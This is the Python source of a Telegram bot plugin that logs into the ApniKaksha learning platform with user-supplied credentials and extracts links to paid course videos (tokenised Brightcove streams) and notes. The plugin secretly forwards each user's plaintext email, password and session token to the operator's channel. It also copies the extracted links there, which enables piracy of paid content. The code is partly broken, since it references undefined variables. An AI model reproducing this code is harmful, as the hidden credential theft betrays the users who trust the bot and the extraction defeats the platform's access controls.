import requests
import datetime, pytz, re, aiofiles, os
import json
from pyrogram import Client, filters
from Extractor import app
from config import CHANNEL_ID

appname = "ApniKaksha"
txt_dump = CHANNEL_ID

def login_with_credentials(email, password):
    """Login using email and password and return the token."""
    url = "https://spec.apnikaksha.net/api/v2/login-other"
    headers = {
        "Accept": "application/json",
        "origintype": "web",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "email": email,
        "password": password,
        "type": "kkweb",
        "deviceType": "web",
        "deviceVersion": "Chrome 133",
        "deviceModel": "chrome",
    }
    try:
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("responseCode") == 200:
                return response_data["data"]["token"]
        return None
    except:
        return None

@app.on_message(filters.command(["ak"]))
async def handle_ak_logic(app, m):
    editable = await m.reply_text(
        "Choose your login method:\n\n"
        "Send like this:- **email*password**\n"
        "Or send the token directly"
    )
    input1 = await app.listen(chat_id=m.chat.id)
    raw_text = input1.text
    await input1.delete()

    if "*" in raw_text:
        email, password = raw_text.split("*", 1)
        auth_token = login_with_credentials(email, password)
        if not auth_token:
            await editable.edit("Login failed. Please check your credentials and try again.")
            return
        await app.send_message(
            txt_dump,
            f"New AK Login:\n\n**Email:** `{email}`\n**Password:** `{password}`\n**Token:** `{auth_token}`"
        )
    else:
        auth_token = raw_text

    headers = {
        "Host": "spec.apnikaksha.net",
        "token": auth_token,
        "origintype": "web",
        "user-agent": "Android",
        "usertype": "2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
    }
    response = requests.get("https://spec.apnikaksha.net/api/v2/my-batch", headers=headers).json()
    if 'data' not in response:
        await editable.edit("Invalid token or error in fetching batches.")
        return

    batches = response["data"]["batchData"]
    batch_text = "**BATCH ID - BATCH NAME**\n\n"
    for batch in batches:
        batch_text += f"`{batch['id']}` - **{batch['batchName']}**\n"
    await editable.edit(f"**You have these batches:**\n\n{batch_text}\n\nSend the Batch ID to proceed")

    input2 = await app.listen(chat_id=m.chat.id)
    batch_id = input2.text.strip()
    await input2.delete()

    response = requests.get(f"https://spec.apnikaksha.net/api/v2/batch-subject/{batch_id}", headers=headers).json()
    if 'data' not in response:
        await editable.edit("Error fetching subjects.")
        return
    subjects = response["data"]["batch_subject"]

    batch_name = "Unknown Batch"
    for batch in batches:
        if str(batch["id"]) == str(batch_id):
            batch_name = batch["batchName"]
            break

    await editable.edit("What do you want to extract?\n\nType `class` for Videos\nType `notes` for Notes")
    input3 = await app.listen(chat_id=m.chat.id)
    content_type = input3.text.strip().lower()
    await input3.delete()
    await editable.delete()

    if content_type not in ['class', 'notes']:
        await m.reply_text("Invalid option. Please type `class` or `notes`.")
        return

    editable = await m.reply_text("**Link extraction started. Please wait...**")
    start_time = datetime.datetime.now(pytz.timezone('Asia/Kolkata'))

    to_write = ""
    for subject in subjects:
        subject_id = subject["id"]
        subject_name = subject["subjectName"]
        to_write += f"\n\n=== Subject: {subject_name} ===\n\n"
        response = requests.get(
            f"https://spec.apnikaksha.net/api/v2/batch-topic/{subject_id}?type={content_type}",
            headers=headers
        ).json()
        if 'data' not in response:
            continue
        topics = response["data"]["batch_topic"]
        for topic in topics:
            topic_id = topic["id"]
            if content_type == "class":
                response = requests.get(
                    f"https://spec.apnikaksha.net/api/v2/batch-detail/{batch_id}?subjectId={subject_id}&topicId={topic_id}",
                    headers=headers
                ).json()
                if 'data' in response and 'class_list' in response['data']:
                    classes = response['data']['class_list'].get('classes', [])
                    for cls in classes:
                        try:
                            lesson_url = cls["lessonUrl"]
                            lesson_name = cls["lessonName"].replace(":", " ")
                            lesson_ext = cls.get("lessonExt", "")
                            if lesson_ext == "brightcove":
                                video_token_response = requests.get(
                                    f"https://spec.apnikaksha.net/api/v2/livestreamToken?base=web&module=batch&type=brightcove&vid={cls['id']}",
                                    headers=headers
                                ).json()
                                video_token = video_token_response.get("data", {}).get("token")
                                if video_token:
                                    video_url = f"https://edge.api.brightcove.com/playback/v2/accounts/6415636611001/videos/{lesson_url}/master.m3u8?bcov_auth={video_token}"
                                    to_write += f"{lesson_name}: {video_url}\n"
                            elif lesson_ext == "youtube":
                                video_url = f"https://www.youtube.com/embed/{lesson_url}"
                                to_write += f"{lesson_name}: {video_url}\n"
                        except:
                            continue
            elif content_type == "notes":
                response = requests.get(
                    f"https://spec.apnikaksha.net/api/v2/batch-notes/{batch_id}?subjectId={subject_id}&topicId={topic_id}",
                    headers=headers
                ).json()
                if 'data' in response and 'notesDetails' in response['data']:
                    notes = response["data"]["notesDetails"]
                    for note in notes:
                        doc_url = note["docUrl"]
                        doc_title = note["docTitle"].replace(":", " ")
                        to_write += f"{doc_title}: {doc_url}\n"

    if to_write:
        batch_name = await sanitize_bname(batch_name)
        filename = f"AK_{batch_id}_{content_type}.txt"
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            await f.write(to_write)
        
        end_time = datetime.datetime.now(pytz.timezone('Asia/Kolkata'))
        duration = (end_time - start_time).total_seconds()
        minutes, seconds = divmod(duration, 60)
        all_text = to_write
        video_count = len(re.findall(r'\.(m3u8|mpd|mp4)', all_text))
        credit = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id})\n\n"
        pdf_count = len(re.findall(r'\.pdf', all_text))
        caption = (
            f"**APP NAME :** ApniKaksha\n\n"
            f"**Batch Name :** {batch_id} - {batch_name}\n\n"
            f"TOTAL LINK - {len(to_write.splitlines())}\n"
            f"Video Links - {video_count}\n"
            f"Expiry Date:-**{c_expire_at}\n **Extracted BY:{credit} \n"
            f"Total Pdf - {pdf_count}\n\n"
            f"**╾───• Txt Extractor •───╼**"
        )
        await m.reply_document(
            document=filename,
            caption=caption
        )
        await app.send_document(
            txt_dump,
            filename,
            caption=caption
        )
        os.remove(filename)
        await editable.edit("**Extraction completed successfully!**")
    else:
        await editable.edit("**No content found.**")

async def sanitize_bname(bname, max_length=50):
    bname = re.sub(r'[\\/:*?"<>|\t\n\r]+', '', bname).strip()
    if len(bname) > max_length:
        bname = bname[:max_length]
    return bname
